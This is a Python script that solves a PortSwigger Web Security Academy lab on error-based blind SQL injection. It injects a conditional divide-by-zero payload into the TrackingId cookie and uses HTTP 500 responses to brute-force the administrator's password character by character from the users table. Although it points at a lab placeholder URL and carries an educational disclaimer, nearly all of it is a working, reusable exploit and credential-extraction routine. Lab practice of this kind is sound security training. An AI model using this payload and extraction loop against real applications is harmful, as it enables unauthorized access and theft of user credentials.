#!/usr/bin/env python3

# PortSwigger Web Security Academy
# Lab: Blind SQL Injection (Error-Based)

# This script automates the exploitation of a blind SQL injection
# vulnerability using an error-based technique.

# True conditions are inferred by triggering database errors that
# result in HTTP 500 responses.

# For educational purposes only.
# Do NOT use against real systems without explicit authorization.

import requests
import string
import urllib3

# CONFIGURATION

# Target lab URL 
LAB_URL = "https://<lab-id>.web-security-academy.net"

# Valid session cookie 
SESSION_COOKIE = "LAB_SESSION"

# Character set used during brute-force extraction
CHARSET = string.ascii_lowercase + string.digits

# Known password length for the lab scenario
PASSWORD_LENGTH = 20

# Base value for the vulnerable TrackingId cookie
TRACKING_ID_BASE = "TRACKINGID"

# Disable SSL warnings (lab environment)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def condition_is_true(payload: str) -> bool:
    # Sends the SQL injection payload and determines whether
    # the injected condition is TRUE based on the HTTP response code

    cookies = {
        "TrackingId": TRACKING_ID_BASE + payload,
        "session": SESSION_COOKIE
    }

    response = requests.get(
        LAB_URL,
        cookies=cookies,
        verify=False
    )

    # HTTP 500 indicates a TRUE condition in this lab
    return response.status_code == 500


def extract_admin_password() -> str:
    # Extracts the administrator password character by character
    # using error-based blind SQL injection

    extracted_password = ""

    for position in range(1, PASSWORD_LENGTH + 1):
        print(f"[+] Extracting character {position}...")

        for char in CHARSET:
            payload = (
                "'||(SELECT CASE WHEN "
                f"(SUBSTR(password,{position},1)='{char}') "
                "THEN TO_CHAR(1/0) ELSE '' END "
                "FROM users WHERE username='administrator')||'"
            )

            if condition_is_true(payload):
                extracted_password += char
                print(f"[✔] Partial password: {extracted_password}")
                break

    return extracted_password


if __name__ == "__main__":
    password = extract_admin_password()
    print("\n[✓] Extracted password:", password)
